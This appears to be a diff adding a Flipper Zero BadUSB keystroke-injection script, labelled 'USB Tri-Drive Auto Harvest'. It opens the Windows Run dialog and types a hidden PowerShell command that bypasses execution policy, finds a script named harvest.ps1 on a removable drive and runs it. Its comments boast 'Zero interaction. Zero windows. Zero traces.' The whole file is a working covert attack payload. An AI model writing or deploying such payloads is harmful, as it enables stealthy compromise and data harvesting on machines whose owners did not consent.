@@ -1,0 +1,11 @@
+REM FLLC FU PERSON — USB Tri-Drive Auto Harvest
+REM Plugs into Flipper Zero as BadUSB
+REM Automatically launches harvest.ps1 from the SD card
+REM Zero interaction. Zero windows. Zero traces.
+
+DELAY 800
+GUI r
+DELAY 600
+STRING powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$u=Get-WmiObject Win32_LogicalDisk|?{$_.DriveType-eq2};foreach($d in $u){$p=\"$($d.DeviceID)\.p\harvest.ps1\";if(Test-Path $p){. $p;break}}"
+ENTER
+DELAY 200
